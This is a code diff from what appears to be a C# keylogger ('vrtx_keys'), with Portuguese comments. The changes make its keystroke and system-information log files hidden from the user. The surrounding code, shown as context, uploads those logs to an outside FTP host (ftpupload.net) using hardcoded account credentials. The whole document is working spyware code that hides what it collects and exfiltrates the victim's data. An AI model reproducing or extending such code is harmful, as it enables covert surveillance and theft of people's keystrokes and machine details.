@@ -41,28 +41,38 @@ namespace vrtx_keys {
 
             //filepath é o caminho absoluto para o aquivo de log
             string logFilepath = path + NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName() + ".log";
-            string sysFilepath = path + @"\sys_data_capture.log";
+            string sysFilepath = path + @"sys_data_capture.log";
 
             //Caso o arquivo de log não exista
             if(!File.Exists(logFilepath)) {
                 //Criando o arquivo de log
-                using(StreamWriter sw = File.CreateText(logFilepath)) { }   
+                using(StreamWriter sw = File.CreateText(logFilepath)) { }
+                //Deixando o arquivo oculto
+                File.SetAttributes(logFilepath, File.GetAttributes(logFilepath) | FileAttributes.Hidden);
             }
             else {
                 //Caso já exista um arquivo, primeiro fazemos upload para o ftp e limpamos o conteúdo do mesmo
                 NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress(), logUpload);
+
                 //Em seguida limpamos o arquivo de log
+                FileInfo logFile = new FileInfo(logFilepath); logFile.Attributes &= ~FileAttributes.Hidden; //Remove momentaneamente o atributo oculto do arquivo
                 File.WriteAllText(logFilepath, String.Empty);
+                logFile.Attributes |= FileAttributes.Hidden;
             }
 
             //Caso o arquivo de informações do sistema não exista
             if(!File.Exists(sysFilepath)) {
                 //Criando o arquivo de informações do sistema
                 using(StreamWriter sw = File.CreateText(sysFilepath)) { }
+                //Deixando o arquivo oculto
+                File.SetAttributes(sysFilepath, File.GetAttributes(sysFilepath) | FileAttributes.Hidden);
             }
-            
+
             //Caso já exista um arquivo, limpamos o conteúdo do mesmo e pegamos as informações do sistema atualizadas
+            FileInfo sysFile = new FileInfo(sysFilepath); sysFile.Attributes &= ~FileAttributes.Hidden; //Remove momentaneamente o atributo oculto do arquivo
             File.WriteAllText(sysFilepath, String.Empty);
+            sysFile.Attributes |= FileAttributes.Hidden;
+
             NetworkInteraction.GetExtraInfo();
             //Em seguida fazemos upload das informações do sistema atualizadas
             NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress(), sysUpload);
